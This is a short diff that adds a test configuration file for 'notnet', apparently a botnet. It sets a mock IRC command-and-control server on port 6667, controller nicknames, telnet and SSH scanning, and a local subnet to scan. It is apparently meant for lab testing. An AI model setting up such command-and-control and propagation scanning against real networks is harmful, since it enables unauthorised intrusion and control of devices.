@@ -1,0 +1,8 @@
+# notnet test config - mock IRC C2
+irc_server=irc
+irc_port=6667
+irc_auth_nicks=mockirc
+scan_interval=10
+ssh_enabled=1
+telnet_enabled=1
+scan_targets=192.168.1.0/24
